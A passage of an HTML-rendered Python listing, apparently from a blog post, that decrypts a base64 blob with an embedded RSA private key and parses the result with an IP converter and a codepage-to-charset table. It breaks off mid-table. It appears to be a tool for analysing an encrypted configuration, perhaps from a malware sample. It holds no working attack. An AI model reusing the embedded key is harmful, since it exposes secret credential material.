class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization, hashes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric.padding <span class="keyword">import</span> PKCS1v15</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"></span><br><span class="line">PRIVATE_KEY = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICdAIBADANBgkqhkiG9w0BAQEFAASCAl4wggJaAgEAAoGAUl4XgfLwLRMqeBim</span></span><br><span class="line"><span class="string">0mm63b85NSyNICkOwilPvk135lSe9HZtiw4WIAAK3716/5nNcvBWI+sN7yAiZc9j</span></span><br><span class="line"><span class="string">HdiVrNXpgdqEJMA6KViVyBlKMWQfLuzVqHFcqJzb+UM8XUN1OHZ2ZsO9sPhilVU3</span></span><br><span class="line"><span class="string">W1dP5AipSugvkpYAhdQWN08WVLMCAwEAAQKBgClZWuu9jZzTNkq79WND+K9BQ/LR</span></span><br><span class="line"><span class="string">vrcaZXJLUuDx+vMCIBoRKcTY+XpvCwZvFMQj7eN5i4TUh1Y4B4yco+FjzR85KDCz</span></span><br><span class="line"><span class="string">q9KuLsJzGcxQQSfcAzDhhLAEhoEaR0ud/F+ltL+RRRv/Pv8DVJG02rWfiFliKecb</span></span><br><span class="line"><span class="string">Y2lS6I7VarAeo4ahAkEAkTXj5VW3w40YhnWoh/hyoCcCa2ic+HIM11hlALQiXE3P</span></span><br><span class="line"><span class="string">KLGj+WeVNzzRveNhQDjDwYZBBl5rvSinhFJ8glXjbQJBAJE14+VVt8ONGIZ1qIf4</span></span><br><span class="line"><span class="string">cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RSfIJV</span></span><br><span class="line"><span class="string">5J8CQHq8lC4p77NoNUyhcpvLEgfwMQlcWSFeNSBn5KddmpVuZyU8UR7jwKn5zEa2</span></span><br><span class="line"><span class="string">RGMmF8AhnCCn+mTeUgl0Ny1rL1kCQCGUN64Jw2PqFdjKDn3a2w7j1nBmEZ52KTgH</span></span><br><span class="line"><span class="string">Ddw6y5NSvuvnIEcFSAEtBEeH9C44sjPnStQhM4LbitlThc1R9XsCQCKkR++Zd/hF</span></span><br><span class="line"><span class="string">okuUihZl79eQ1ekZyxgh5p51S/b3Gpo0BsDseESze3C7r4bRA/Vi4A82nbwU2h7n</span></span><br><span class="line"><span class="string">Zd8mFVZPDUM=</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">encode_data = <span class="string">&#x27;SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=&#x27;</span><span class="comment"># Load the private key</span></span><br><span class="line">private_key = serialization.load_pem_private_key(</span><br><span class="line">    PRIVATE_KEY.encode(),</span><br><span class="line">    password=<span class="literal">None</span>,</span><br><span class="line">    backend=default_backend()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the data using the private key</span></span><br><span class="line">ciphertext = base64.b64decode(encode_data)</span><br><span class="line">plaintext = private_key.decrypt(</span><br><span class="line">    ciphertext,</span><br><span class="line">    PKCS1v15()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isFlag</span>(<span class="params">var, flag</span>):</span><br><span class="line">    <span class="keyword">return</span> (var &amp; flag) == flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">toIP</span>(<span class="params">var</span>):</span><br><span class="line">    var2 = (var &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">    var4 = (var &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    var6 = (var &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">    var8 = var &amp; <span class="number">0x000000FF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var2&#125;</span>.<span class="subst">&#123;var4&#125;</span>.<span class="subst">&#123;var6&#125;</span>.<span class="subst">&#123;var8&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getName</span>(<span class="params">var0</span>):</span><br><span class="line">    <span class="comment"># Your existing getName function remains unchanged</span></span><br><span class="line">    <span class="keyword">if</span> var0 == <span class="number">37</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM037&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">437</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM437&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">500</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM500&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">708</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-6&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">709</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">710</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">720</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM437&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">737</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM737&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">775</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM775&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">850</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM850&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">852</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM852&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">855</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM855&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">857</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM857&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">858</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM00858&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">860</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM860&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">861</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM861&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">862</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM862&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">863</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM863&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">864</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM864&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">865</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM865&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">866</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM866&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">869</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM869&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">870</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM870&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">874</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-windows-874&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">875</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM875&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">932</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Shift_JIS&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-mswin-936&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">949</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-windows-949&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">950</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Big5&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1026</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM1026&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1047</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM1047&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1140</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01140&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1141</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01141&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1142</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01142&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1143</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01143&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1144</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01144&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1145</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01145&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1146</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01146&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1147</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01147&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1148</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01148&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1149</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01149&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-16LE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1201</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-16BE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1250</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1250&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1251</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1251&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1252</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1252&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1253</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1253&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1254</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1254&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1255</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1255&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1256</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1256&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1257</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1257&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1258</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1258&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1361</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-Johab&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacRoman&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10002</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10003</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10004</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacArabic&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10005</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacHebrew&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10006</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacGreek&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10007</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacCyrillic&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10008</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10010</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacRomania&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10017</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacUkraine&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10021</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacThai&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10029</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacCentralEurope&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10079</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacIceland&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10081</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacTurkish&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10082</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacCroatian&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">12000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-32LE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">12001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-32BE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISO-2022-CN-CNS&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20002</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20003</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20004</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20005</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20105</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20106</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20107</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20108</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20127</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;US-ASCII&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20261</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20269</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20273</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM273&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20277</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM277&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20278</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM278&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20280</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM280&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20284</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM284&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20285</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM285&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20290</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM290&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20297</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM297&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20420</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM420&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20423</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20424</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM424&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20833</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20838</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM-Thai&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20866</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;KOI8-R&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20871</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM871&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20880</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20905</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20924</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20932</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EUC-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB2312&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20949</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">21025</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM1025&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">21027</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">21866</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;KOI8-U&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28591</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-1&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28592</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-2&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28593</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-3&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28594</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-4&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28595</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-5&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28596</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-6&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28597</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-7&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28598</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-8&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28599</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-9&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28603</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-13&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28605</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-15&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">29001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">38598</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-8&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50220</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50221</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-JP-2&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50222</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50225</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-KR&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50227</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-CN&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50229</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-CN&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50930</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM930&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50931</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50933</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM933&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50935</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM935&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50937</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM937&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50939</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM939&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51932</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EUC-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB2312&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51949</span>:</span><br><span class="line">        <span 